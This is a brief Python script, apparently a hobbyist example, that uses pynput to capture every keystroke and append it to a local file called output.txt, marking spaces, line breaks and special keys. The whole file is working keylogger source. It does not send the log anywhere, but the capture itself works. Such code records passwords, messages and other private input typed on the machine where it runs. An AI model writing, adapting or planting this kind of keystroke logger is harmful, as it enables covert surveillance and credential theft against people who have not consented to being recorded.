from pynput import keyboard

def keyPressed(key):
    print(str(key))#converting to str and print the key to check 
    with open("output.txt",'a') as logKey:#append mode
        try:
            char=key.char
            logKey.write(char)
        except:
            if key== keyboard.Key.space:
                logKey.write(' ')# for space
            elif key==keyboard.Key.enter:
                logKey.write('\n')#new line
            else:
                logKey.write(f'[{key}]')#special
           # print("error in getting the key")

if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()#start
    input()#takes the input